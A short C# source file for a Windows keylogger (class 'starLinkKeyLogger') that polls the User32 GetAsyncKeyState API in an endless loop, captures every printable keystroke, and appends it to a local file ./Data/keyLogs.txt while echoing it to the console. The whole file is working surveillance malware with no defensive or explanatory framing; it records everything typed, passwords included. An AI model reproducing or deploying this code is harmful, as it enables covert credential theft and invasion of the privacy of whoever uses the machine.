using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

namespace WindowsLogger.KeyLogger
{
	class starLinkKeyLogger
	{
		[DllImport("User32.dll")]
		public static extern int GetAsyncKeyState(Int32 i);

		static string keyLog = "";


		public void run()
		{
			string filepath = "./Data/keyLogs.txt";

			if(!File.Exists(filepath))
            {
				using (StreamWriter sw = File.CreateText(filepath)) 
				{
					
				}
            }
			while (true)
			{
				Thread.Sleep(15);
				for (int i = 32; i < 127; i++)
				{
					int keyState = GetAsyncKeyState(i);
					if (keyState == 32769)
					{
						Console.Write((char) i);
						using (StreamWriter sw = File.AppendText(filepath))
                        {
							sw.Write((char)i);
                        }
					} 
				}
			}
		}
	}
}
